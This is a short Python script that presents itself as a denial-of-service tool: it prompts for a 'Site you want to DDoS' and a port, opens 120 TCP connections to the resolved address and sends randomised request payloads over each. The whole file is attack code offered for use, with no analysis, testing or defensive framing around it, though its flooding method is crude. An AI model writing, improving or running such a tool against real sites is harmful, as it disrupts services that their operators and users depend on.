
from helpers import get_random_url
import json
import socket


def attack_worker(ip_address, port, number_of_sockets, ):
    try:
        # Connection sockets list
        sockets = []
        # For each socket create one http connection
        # Create the connection inside the for loop
        for i in range(number_of_sockets):
            ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ddos.connect((ip_address, port))

            # Append the connection inside the sockets list
            sockets.append(ddos)

        # Send the request from each socket connection
        for ddos in sockets:
            # Get the random headers and url
            random_url = get_random_url()
            message = json.dumps(random_url).encode()
            ddos.send(message)
            ddos.sendto(message, (ip_address, port))
            ddos.send(message)

        # Close the connection to cleanup
        for conn_close in sockets:
            try:
                conn_close.close()
            except:
                pass  # silently ignore
    except Exception as err:
        print(err)


def main():
    host = input("Site you want to DDoS:")
    port = int(input("Enter port number:"))

    ip_address = socket.gethostbyname(host)

    # Default number of sockets
    number_of_sockets = 120

    print("|| DDoS Loaded ||")

    # Pass number of sockets
    attack_worker(ip_address, port, number_of_sockets)


if __name__ == "__main__":
    main()
